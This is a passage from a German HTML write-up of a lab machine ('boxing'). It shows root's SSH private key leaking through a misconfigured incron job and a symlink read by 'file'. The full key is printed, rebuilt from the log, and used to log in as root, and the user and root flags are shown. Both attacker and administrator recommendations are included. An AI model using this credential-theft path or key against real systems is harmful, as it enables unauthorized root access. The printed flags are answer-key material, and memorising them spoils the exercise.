+NmYTJpLM/2q2gamZ3GcMx843wLxmPzyhIvb03Zv6e5FgP7splW9CGRiShrMlfGgqZ8GRyU: cannot open `NmYTJpLM/2q2gamZ3GcMx843wLxmPzyhIvb03Zv6e5FgP7splW9CGRiShrMlfGgqZ8GRyU' (No such file or directory)
+BAWanDaQ4kMaAtVXeUxuLg5lkcQwIo+obGujOPfyfB0H949LwvEjEo++1VvohckzSl+8R9: cannot open `BAWanDaQ4kMaAtVXeUxuLg5lkcQwIo+obGujOPfyfB0H949LwvEjEo++1VvohckzSl+8R9' (No such file or directory)
+vbSum/tLq4LWP9SVRlHqfoYxKGVRCyIoE5bsk/8cBIOtfqhHRWjMrD308VMBkSdVHYi/Xu: cannot open `vbSum/tLq4LWP9SVRlHqfoYxKGVRCyIoE5bsk/8cBIOtfqhHRWjMrD308VMBkSdVHYi/Xu' (No such file or directory)
+l9IG2QItmAqy+i8y1VtsIv5DrFPEKHywzRculHNncW1xlByOsdzp1e1fy/SE+J7U1ybU2X: cannot open `l9IG2QItmAqy+i8y1VtsIv5DrFPEKHywzRculHNncW1xlByOsdzp1e1fy/SE+J7U1ybU2X' (No such file or directory)
+xC24eSrCTmziep+zNrJf6+iRydSpBupBQYCicvN/7DI9AX0e1kB7TK9m6KOkgV+ZitIyq2: cannot open `xC24eSrCTmziep+zNrJf6+iRydSpBupBQYCicvN/7DI9AX0e1kB7TK9m6KOkgV+ZitIyq2' (No such file or directory)
+ySuChX2s9nvBrH3o/KboyhxAQzh/uGLq4VQvpucE3VgwTankj169/eKluKYh8CjE4KECoy: cannot open `ySuChX2s9nvBrH3o/KboyhxAQzh/uGLq4VQvpucE3VgwTankj169/eKluKYh8CjE4KECoy' (No such file or directory)
+MCWROF55q40MZ63ETYQf1H397I3K0K+LQtle3BV9AAAFiAwmGxQMJhsUAAAAB3NzaC1yc2: cannot open `MCWROF55q40MZ63ETYQf1H397I3K0K+LQtle3BV9AAAFiAwmGxQMJhsUAAAAB3NzaC1yc2' (No such file or directory)
+EAAAGBAJAgqwkZhsteIbtaovSfHQ6ClJJkbmj7Ttk6At0v2nsZsLht<!-- Fortsetzung von <section id="privilege-escalation"> -->
+......
+.....
+....
+...
+..
+.
+           
+soRXxjA5g9dZrTAAAAC3Jvb3RAYm94aW5nAQIDBAUGBw==:                         cannot open `soRXxjA5g9dZrTAAAAC3Jvb3RAYm94aW5nAQIDBAUGBw==' (No such file or directory)
+-----END OPENSSH PRIVATE KEY-----</pre>
+<!-- Hier fehlen wahrscheinlich noch andere Ausgaben des sos.sh Skripts, aber im Log sind nur diese "cannot open"-Fehler der file-Ausgabe enthalten -->
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die ersten 100 Zeilen der kopierten Logdatei (`output-logs.txt`) werden angezeigt. Das Skript `/opt/sos/sos.sh` wurde offensichtlich durch die Attributänderung an `user.txt` als Root getriggert. Es wechselte nach `/home/cassius` und führte dort `file *` aus. Der `file`-Befehl versucht, den Dateityp zu bestimmen. Bei dem Symlink `rootrsa`, der auf `/root/.ssh/id_rsa` zeigt, liest `file` den Anfang des privaten Schlüssels, um den Typ zu bestimmen. Da die Zeilen des Schlüssels keine gültigen Dateinamen sind, gibt `file` für jede Zeile die Fehlermeldung "cannot open '...' (No such file or directory)" aus, *nachdem* es den Inhalt der Zeile selbst ausgegeben hat. Dadurch wird der Inhalt des privaten Schlüssels von Root in die Logdatei geschrieben.</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Der private SSH-Schlüssel von Root wurde erfolgreich durch die Incron-Fehlkonfiguration und die Race Condition exfiltriert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Rekonstruiere den SSH-Schlüssel aus dieser Logdatei (entferne die Fehlermeldungen). Speichere ihn, setze `chmod 600` und logge dich als Root via SSH ein.
+            <br>**Empfehlung (Admin):** **Dringend:** Entferne die Incron-Regel. Überprüfe das System auf weitere unsichere Konfigurationen. Widerrufe/Ersetze den kompromittierten Root-SSH-Schlüssel.</p>
+
+             <p class="comment">Rekonstruktion des privaten SSH-Schlüssels aus der exfiltrierten Logdatei.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat sshroot| awk '{print $1}' | tr -d ":"</span></div>
+                     <!-- Annahme: Die relevanten Zeilen wurden zuvor in 'sshroot' gespeichert -->
+                     <pre>
+-----BEGIN
+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
+-----END</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '-----BEGIN OPENSSH PRIVATE KEY-----' > rootkey</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '-----END OPENSSH PRIVATE KEY-----' >> rootkey</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi rootkey</span></div>
+                     <pre><!-- Editor wird geöffnet, um den Key-Inhalt einzufügen --></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der private SSH-Schlüssel wird aus der (vermutlich in `sshroot` gespeicherten) Logdatei extrahiert und rekonstruiert:
+            1.  `cat sshroot | awk '{print $1}' | tr -d ":"`: Extrahiert das erste Feld jeder Zeile (den Schlüsselteil) und entfernt Doppelpunkte, die von der `file`-Ausgabe stammen könnten.
+            2.  Die Zeilen `-----BEGIN OPENSSH PRIVATE KEY-----` und `-----END OPENSSH PRIVATE KEY-----` werden manuell zu einer neuen Datei `rootkey` hinzugefügt.
+            3.  Der extrahierte Schlüsselinhalt wird (vermutlich mit `vi`) zwischen die Begin/End-Markierungen in `rootkey` eingefügt.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Rekonstruktion des privaten SSH-Schlüssels von Root.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Setze die korrekten Dateiberechtigungen für `rootkey` (`chmod 600`) und verwende ihn für den SSH-Login als Root.
+            <br>**Empfehlung (Admin):** Keine spezifischen Maßnahmen für diesen Schritt, außer den bereits genannten.</p>
+
+            <p class="comment">Setzen der korrekten Berechtigungen für die Schlüsseldatei und SSH-Login als Root.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 rootkey</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh root@boxing.hmv -i rootkey</span></div>
+                     <pre>
+The authenticity of host 'boxing.hmv (192.168.2.114)' can't be established.
+ED25519 key fingerprint is SHA256:wQ4AA13WzS+DnZ3CX93jGyXamANQ1waSb5GMik3XS1k.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'boxing.hmv' (ED25519) to the list of known hosts.
+Linux boxing 6.1.0-17-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.69-1 (2023-12-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Feb  4 17:19:34 2024 from 192.168.0.30
+root@boxing:~# <!-- Erfolgreicher Root-Login -->
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@boxing:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">19ed17ba1da85521ce659aeeb5ecd751</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1.  Mit `chmod 600 rootkey` werden die erforderlichen restriktiven Berechtigungen für den privaten Schlüssel gesetzt.
+            2.  Der SSH-Login als `root` zum Ziel `boxing.hmv` wird mit der Schlüsseldatei `rootkey` versucht (`ssh root@boxing.hmv -i rootkey`).
+            3.  Nach Bestätigung des Host-Schlüssels erfolgt der Login erfolgreich ohne Passwortabfrage.
+            4.  Die Root-Flag wird aus `/root/root.txt` gelesen: `<span class="password">19ed17ba1da85521ce659aeeb5ecd751</span>`.</p>
+            <p class="evaluation">**Bewertung:** Kritisch (Erfolg). Die Privilege Escalation über die Incron-Schwachstelle war erfolgreich und führte zu Root-Zugriff.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Test erfolgreich abgeschlossen. Dokumentiere die Ergebnisse und den Exploit-Pfad.
+            <br>**Empfehlung (Admin):** **Höchste Priorität!** System ist kompromittiert. Alle vorherigen Empfehlungen (Incron, LFI, SSRF, Datenbank-Exposition, schwaches Passwort für Cassius, SSH-Härtung) umsetzen. Neuinstallation dringend empfohlen.</p>
+
+             <p class="comment">Abschließende Erfolgsmeldung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, nur Text -->
+                     <pre>Privilege Escalation erfolgreich</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Bestätigt den erfolgreichen Abschluss der Privilegienerweiterung.</p>
+            <p class="evaluation">**Bewertung:** Formale Bestätigung des Erfolgs.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dokumentation abschließen.
+            <br>**Empfehlung (Admin):** Maßnahmen einleiten.</p>
+
+        </section>
+
+        <!-- Flags Section -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/cassius/user.txt</div>
+                    <div class="flag-value"><span class="password">a2b3946358a96bb7a92f61a759a1d972</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">19ed17ba1da85521ce659aeeb5ecd751</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus den Logs extrahiert -->
+        <p>Berichtsdatum: 29. April 2024</p>
+    </footer>
+</body>
+</html>
